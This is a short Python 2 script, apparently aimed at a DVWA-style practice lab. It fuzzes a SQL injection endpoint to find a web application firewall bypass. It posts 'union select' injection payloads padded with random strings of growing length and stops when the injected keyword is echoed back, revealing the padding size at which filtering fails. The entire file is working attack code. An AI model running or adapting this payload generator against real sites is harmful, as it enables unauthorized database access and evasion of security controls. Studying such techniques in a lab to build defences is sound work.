#! /usr/bin/env python
# _*_  coding:utf-8 _*_
# 构造超大数据包绕过_Fuzzing

import requests
import random

headers={"User-Agent":"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.221 Safari/537.36 SE 2.X MetaSr 1.0","Host":"bypass.com","Cookie":"_d_id=f40002adbf80677e710908a0343ffa; PHPSESSID=d736bvp8ur0snsof8p5217lrf5; security=low;"}
url="http://hackrock:812/vulnerabilities/sqli/?Submit=Submit"

def generate_random_str(randomlength=16):
    random_str = ''
    base_str = 'ABCDEFGHIGKLMNOPQRSTUVWXYZabcdefghigklmnopqrstuvwxyz0123456789'
    length = len(base_str) - 1
    for i in range(randomlength):
        random_str += base_str[random.randint(0, length)]
    return random_str

for i in range(500,50000,100):
    payload = {'id':"1'union-- "+generate_random_str(i)+"\r\nselect 1,2#"}
    try:
        response=requests.post(url=url,headers=headers,data=payload,timeout=0.5)
        result = response.content
        print result
        #print result
        if result.count('union'):
            print "Length is : %s " % str(i)
            break
    except:
        print "."
